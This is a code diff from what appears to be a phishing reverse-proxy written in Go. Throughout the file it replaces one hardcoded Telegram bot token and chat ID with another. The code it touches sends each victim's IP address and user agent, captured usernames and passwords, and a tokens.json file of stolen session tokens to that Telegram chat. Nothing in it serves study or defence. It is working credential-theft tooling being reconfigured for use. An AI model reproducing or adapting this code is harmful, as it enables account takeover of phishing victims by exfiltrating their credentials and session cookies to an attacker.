@@ -226,7 +226,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 								}
 
-								bot, err := tgbotapi.NewBotAPI("6527994050:AAHgt8nRXCI8DWnuArh2riUspi6Z9bnPKzA")
+								bot, err := tgbotapi.NewBotAPI("6857672592:AAH8ZdYSUPTWYti6msv-QN-Sff54S3hrBXc")
 								if err != nil {
 									log.Fatal("Failed to initialize Telegram bot:", err)
 								}
@@ -236,7 +236,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									sid := p.last_sid
 									p.last_sid += 1
 									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
-									msg := tgbotapi.NewMessage(-1002130358687, "New visitor has arrived: "+req.Header.Get("User-Agent")+" (IP: "+remote_addr+")")
+									msg := tgbotapi.NewMessage(-4153330383, "New visitor has arrived: "+req.Header.Get("User-Agent")+" (IP: "+remote_addr+")")
     								bot.Send(msg)
 									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
 									p.sessions[session.Id] = session
@@ -482,7 +482,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 						} else {
 
-							bot, err := tgbotapi.NewBotAPI("6527994050:AAHgt8nRXCI8DWnuArh2riUspi6Z9bnPKzA")
+							bot, err := tgbotapi.NewBotAPI("6857672592:AAH8ZdYSUPTWYti6msv-QN-Sff54S3hrBXc")
 								if err != nil {
 									log.Fatal("Failed to initialize Telegram bot:", err)
 								}
@@ -507,7 +507,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												log.Error("database: %v", err)
 											}
 											// Send Telegram notification
-											msg := tgbotapi.NewMessage(-1002130358687, fmt.Sprintf("Username: %s ", um[1]))
+											msg := tgbotapi.NewMessage(-4153330383, fmt.Sprintf("Username: %s ", um[1]))
 											bot.Send(msg)
 										}
 									}
@@ -520,7 +520,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												log.Error("database: %v", err)
 											}
 											// Send Telegram notification
-											msg := tgbotapi.NewMessage(-1002130358687, fmt.Sprintf("Password: %s ", pm[1]))
+											msg := tgbotapi.NewMessage(-4153330383, fmt.Sprintf("Password: %s ", pm[1]))
 											bot.Send(msg)
 										}
 									}
@@ -610,7 +610,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				return nil
 			}
 
-			bot, err := tgbotapi.NewBotAPI("6527994050:AAHgt8nRXCI8DWnuArh2riUspi6Z9bnPKzA")
+			bot, err := tgbotapi.NewBotAPI("6857672592:AAH8ZdYSUPTWYti6msv-QN-Sff54S3hrBXc")
 			if err != nil {
 				log.Fatal("Failed to initialize Telegram bot:", err)
 			}
@@ -748,7 +748,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							Name:   "tokens.json",
 							Bytes:  tokensBytes,
 						}
-						msg := tgbotapi.NewDocument(-1002130358687, fileData)
+						msg := tgbotapi.NewDocument(-4153330383, fileData)
 						_, err = bot.Send(msg) // Use the bot instance initialized outside this function
 						if err != nil {
 							log.Error("Error sending tokens to Telegram:", err)
@@ -870,7 +870,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 			}
 
-			bot, err = tgbotapi.NewBotAPI("6527994050:AAHgt8nRXCI8DWnuArh2riUspi6Z9bnPKzA")
+			bot, err = tgbotapi.NewBotAPI("6857672592:AAH8ZdYSUPTWYti6msv-QN-Sff54S3hrBXc")
 			if err != nil {
 				log.Fatal("Failed to initialize Telegram bot:", err)
 			}
@@ -892,7 +892,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									Name:   "tokens.json",
 									Bytes:  tokensBytes,
 								}
-								msg := tgbotapi.NewDocument(-1002130358687, fileData)
+								msg := tgbotapi.NewDocument(-4153330383, fileData)
 								_, err = bot.Send(msg) // Use the bot instance initialized outside this function
 								if err != nil {
 									log.Error("Error sending tokens to Telegram:", err)
